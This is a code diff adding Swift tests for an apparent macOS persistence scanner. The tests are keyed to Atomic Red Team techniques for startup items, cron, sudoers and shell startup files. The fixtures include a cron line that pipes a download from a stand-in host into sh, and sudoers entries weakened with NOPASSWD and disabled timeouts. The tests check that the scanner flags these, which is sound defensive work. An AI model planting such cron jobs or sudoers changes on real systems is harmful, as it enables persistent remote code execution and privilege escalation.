@@ -54,6 +54,54 @@ struct MorePersistenceTests {
         #expect(r["download-to-shell"] == .high)
     }
 
+    @Test func startupItemsAreHigh() throws {  // ART T1037.005
+        let tmp = try TempDir()
+        try tmp.file("sys/Library/StartupItems/EvilStartup.plist", "x")
+        try tmp.file("sys/Library/StartupItems/atomic/StartupParameters.plist", "x")
+        let items = OtherPersistence.scan(roots(tmp), signatures: FakeSignatures(byPath: [:]), runner: FakeRunner(outputs: [:]))
+        #expect(items.filter { $0.kind == .startupItem }.count == 2)
+        #expect(rules(items)["startup-item"] == .high)
+    }
+
+    @Test func cronFoldersAreScannedLikePeriodicScripts() throws {  // ART T1053.003 #2
+        let tmp = try TempDir()
+        try tmp.file("sys/etc/cron.daily/art", "curl -s https://x.example/p | sh\n")
+        try tmp.file("sys/etc/cron.hourly/art", "echo hi\n")
+        let items = OtherPersistence.scan(roots(tmp), signatures: FakeSignatures(byPath: [:]), runner: FakeRunner(outputs: [:]))
+        #expect(items.filter { $0.kind == .periodicScript }.count == 2)
+        #expect(rules(items)["download-to-shell"] == .high)
+    }
+
+    @Test func aWeakenedSudoersIsHighAndAnyChangeShowsInADiff() throws {  // ART T1548.003 #3, #5
+        let tmp = try TempDir()
+        let stock = "Defaults env_reset\nroot ALL = (ALL) ALL\n%admin ALL = (ALL) ALL\n"
+        try tmp.file("sys/etc/sudoers", stock)
+        let before = OtherPersistence.scan(roots(tmp), signatures: FakeSignatures(byPath: [:]), runner: FakeRunner(outputs: [:]))
+        #expect(rules(before)["sudoers-weakened"] == nil)
+        try tmp.file("sys/etc/sudoers", "Defaults env_reset,timestamp_timeout=-1\nroot ALL = (ALL) ALL\nDefaults !tty_tickets\n")
+        let after = OtherPersistence.scan(roots(tmp), signatures: FakeSignatures(byPath: [:]), runner: FakeRunner(outputs: [:]))
+        #expect(rules(after)["sudoers-weakened"] == .high)
+        #expect(!PersistenceBaseline.diff(old: before, new: after).changed.isEmpty)
+        // Unreadable (not root): no item, so no false "removed".
+        #expect(OtherPersistence.sudoersWeakening("%admin ALL=(ALL) NOPASSWD: ALL\n") == ["%admin ALL=(ALL) NOPASSWD: ALL"])
+    }
+
+    @Test func anyChangeToAShellStartupFileShowsInADiff() throws {  // ART T1546.004
+        let tmp = try TempDir()
+        try tmp.file("home/.bash_profile", "export PATH=/usr/local/bin:$PATH\n")
+        let r = roots(tmp)
+        let before = PersistenceScanner.scan(r, signatures: FakeSignatures(byPath: [:]), btm: [], cron: nil)
+        try tmp.file(
+            "home/.bash_profile", "export PATH=/usr/local/bin:$PATH\necho 'Hello from Atomic Red Team T1546.004' > /tmp/T1546.004\n")
+        let after = PersistenceScanner.scan(r, signatures: FakeSignatures(byPath: [:]), btm: [], cron: nil)
+        let d = PersistenceBaseline.diff(old: before, new: after)
+        #expect(d.changed.contains { $0.path.hasSuffix(".bash_profile") })
+        // A new file is "added".
+        try tmp.file("home/.bashrc", "echo hi\n")
+        let later = PersistenceScanner.scan(r, signatures: FakeSignatures(byPath: [:]), btm: [], cron: nil)
+        #expect(PersistenceBaseline.diff(old: after, new: later).added.contains { $0.path.hasSuffix(".bashrc") })
+    }
+
     @Test func sudoersPamAndAtJobs() throws {
         let tmp = try TempDir()
         try tmp.file("sys/etc/sudoers.d/zz-extra", "x")
